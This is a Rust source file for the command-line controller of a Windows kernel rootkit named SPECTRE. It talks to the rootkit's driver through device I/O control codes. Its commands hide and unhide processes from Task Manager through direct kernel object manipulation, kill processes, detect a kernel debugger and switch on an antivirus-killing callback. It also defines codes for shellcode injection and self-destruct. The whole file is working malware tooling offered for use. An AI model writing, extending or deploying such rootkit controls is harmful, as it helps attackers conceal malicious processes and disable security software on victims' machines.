use std::io::{self, Write};
use std::ptr;
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE,
    FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};

// Device path — must match spectre_rootkit's symbolic link (\DosDevices\SPECTREDrv)
const DEVICE_PATH: &[u16] = &[
    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
    'S' as u16, 'P' as u16, 'E' as u16, 'C' as u16,
    'T' as u16, 'R' as u16, 'E' as u16, 'D' as u16,
    'r' as u16, 'v' as u16, 0u16,
];

// IOCTL codes — must match spectre_rootkit's definitions
const IOCTL_KILL_PROCESS: u32     = 0x900;
const IOCTL_HIDE_PROCESS: u32     = 0x901;
const IOCTL_UNHIDE_PROCESS: u32   = 0x902;
const IOCTL_CHECK_DEBUGGER: u32   = 0x903;
const IOCTL_INJECT_SHELLCODE: u32 = 0x904;
const IOCTL_KILL_AV: u32          = 0x905;
const IOCTL_SELF_DESTRUCT: u32    = 0x999;

fn open_device() -> Option<HANDLE> {
    unsafe {
        let handle = CreateFileW(
            DEVICE_PATH.as_ptr(),
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if handle == INVALID_HANDLE_VALUE {
            None
        } else {
            Some(handle)
        }
    }
}

fn send_pid_ioctl(handle: HANDLE, ioctl: u32, pid: u32) -> bool {
    let pid_u64 = pid as u64;
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            ioctl,
            &pid_u64 as *const u64 as *const _,
            core::mem::size_of::<u64>() as u32,
            ptr::null_mut(),
            0,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    }
}

fn check_debugger(handle: HANDLE) -> bool {
    let mut out: u8 = 0;
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            IOCTL_CHECK_DEBUGGER,
            ptr::null_mut(),
            0,
            &mut out as *mut u8 as *mut _,
            1,
            &mut returned,
            ptr::null_mut(),
        );
    }
    out != 0
}

fn kill_av(handle: HANDLE) -> bool {
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            IOCTL_KILL_AV,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
            0,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    }
}

fn print_help() {
    println!("SPECTRE CLI — Kernel Stealth Controller");
    println!("Commands:");
    println!("  hide <pid>      — Hide process from Task Manager (DKOM)");
    println!("  unhide <pid>    — Restore a hidden process");
    println!("  kill <pid>      — Terminate a process");
    println!("  check           — Check if a kernel debugger is attached");
    println!("  av              — Activate AV-killer callback");
    println!("  help            — Show this help");
    println!("  exit            — Quit");
}

fn main() {
    println!("[SPECTRE] Opening device...");

    let handle = match open_device() {
        Some(h) => {
            println!("[SPECTRE] Connected to driver!");
            h
        }
        None => {
            eprintln!("[SPECTRE] ERROR: Cannot open device. Is driver loaded?");
            return;
        }
    };

    print_help();

    loop {
        print!("> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            break;
        }

        let parts: Vec<&str> = input.trim().splitn(2, ' ').collect();
        let arg = parts.get(1).map(|s| s.trim()).unwrap_or("");

        match parts[0] {
            "hide" => {
                if arg.is_empty() {
                    println!("Usage: hide <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_HIDE_PROCESS, pid) {
                        println!("[+] Hidden PID {} from Task Manager", pid);
                    } else {
                        println!("[-] Failed to hide PID {} (invalid PID or already hidden?)", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "unhide" => {
                if arg.is_empty() {
                    println!("Usage: unhide <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_UNHIDE_PROCESS, pid) {
                        println!("[+] Unhidden PID {}", pid);
                    } else {
                        println!("[-] Failed to unhide PID {} (not in hidden registry?)", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "kill" => {
                if arg.is_empty() {
                    println!("Usage: kill <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_KILL_PROCESS, pid) {
                        println!("[+] Killed PID {}", pid);
                    } else {
                        println!("[-] Failed to kill PID {}", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "check" => {
                if check_debugger(handle) {
                    println!("[!] Kernel debugger DETECTED!");
                } else {
                    println!("[*] No kernel debugger detected.");
                }
            }

            "av" => {
                if kill_av(handle) {
                    println!("[+] AV-killer activated");
                } else {
                    println!("[-] Failed to activate AV-killer");
                }
            }

            "help" => print_help(),

            "exit" => break,

            "" => {}

            _ => println!("Unknown command. Type 'help' for commands."),
        }
    }

    unsafe { CloseHandle(handle); }
    println!("[SPECTRE] Disconnected.");
}
